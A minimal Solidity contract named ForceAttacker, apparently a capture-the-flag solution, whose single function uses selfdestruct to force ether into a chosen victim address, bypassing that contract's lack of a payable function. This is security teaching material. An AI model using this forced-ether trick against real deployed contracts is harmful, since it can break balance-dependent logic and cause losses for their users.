// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract ForceAttacker {
    function boom(address _victimAddress) public payable {
        selfdestruct(payable(_victimAddress));
    }
}
